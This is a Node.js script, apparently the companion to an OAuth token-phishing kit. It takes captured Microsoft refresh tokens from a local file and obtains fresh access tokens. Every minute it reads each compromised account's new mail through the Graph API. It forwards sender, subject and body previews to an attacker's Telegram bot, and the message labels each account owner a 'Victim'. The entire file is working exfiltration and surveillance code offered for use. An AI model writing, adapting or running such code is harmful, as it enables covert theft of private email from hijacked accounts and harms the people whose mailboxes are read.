// email-monitor.js - Put this in your existing project folder
require('dotenv').config();
const fetch = require('node-fetch');
const fs = require('fs');
const path = require('path');

// Use the same environment variables
const { CLIENT_ID, CLIENT_SECRET, TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID } = process.env;

// Load from your existing captured_data.json
const CAPTURED_DATA_FILE = path.join(__dirname, 'captured_data.json');
let CAPTURED_DATA = [];

if (fs.existsSync(CAPTURED_DATA_FILE)) {
    CAPTURED_DATA = JSON.parse(fs.readFileSync(CAPTURED_DATA_FILE, 'utf8'));
    console.log('📂 Loaded accounts for monitoring:', CAPTURED_DATA.length);
}

async function telegramSend(text) {
    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    const body = { 
        chat_id: TELEGRAM_CHAT_ID, 
        text, 
        parse_mode: 'HTML' 
    };
    await fetch(url, { 
        method: 'POST', 
        headers: { 'Content-Type': 'application/json' }, 
        body: JSON.stringify(body) 
    });
}

async function monitorEmails() {
    console.log('🔍 Checking for new emails...');
    
    for (const account of CAPTURED_DATA) {
        if (!account.tokens?.refresh_token) continue;
        
        try {
            // Refresh token
            const tokenResponse = await fetch('https://login.microsoftonline.com/common/oauth2/v2.0/token', {
                method: 'POST',
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                body: new URLSearchParams({
                    client_id: CLIENT_ID,
                    client_secret: CLIENT_SECRET,
                    refresh_token: account.tokens.refresh_token,
                    grant_type: 'refresh_token',
                    scope: 'Mail.Read'
                })
            });
            
            const tokens = await tokenResponse.json();
            if (!tokens.access_token) continue;
            
            // Get new emails from last 5 minutes
            const fiveMinutesAgo = new Date(Date.now() - 5 * 60 * 1000).toISOString();
            const emailResponse = await fetch(`https://graph.microsoft.com/v1.0/me/messages?$filter=receivedDateTime ge ${fiveMinutesAgo}&$top=10`, {
                headers: {
                    'Authorization': `Bearer ${tokens.access_token}`,
                    'Content-Type': 'application/json'
                }
            });
            
            if (emailResponse.ok) {
                const emails = await emailResponse.json();
                if (emails.value && emails.value.length > 0) {
                    for (const email of emails.value) {
                        const message = `📧 <b>NEW EMAIL</b>\n\n` +
                                      `Victim: ${account.email}\n` +
                                      `From: ${email.from?.emailAddress?.name}\n` +
                                      `Subject: ${email.subject}\n` +
                                      `Time: ${new Date(email.receivedDateTime).toLocaleString()}\n` +
                                      `Preview: ${(email.bodyPreview || '').substring(0, 300)}`;
                        
                        await telegramSend(message);
                    }
                }
            }
            
        } catch (error) {
            console.log(`Error monitoring ${account.email}:`, error.message);
        }
        
        // Wait 3 seconds between accounts
        await new Promise(resolve => setTimeout(resolve, 3000));
    }
    
    // Check again in 1 minute
    setTimeout(monitorEmails, 60000);
}

// Start monitoring
console.log('🚀 Starting email monitor...');
monitorEmails();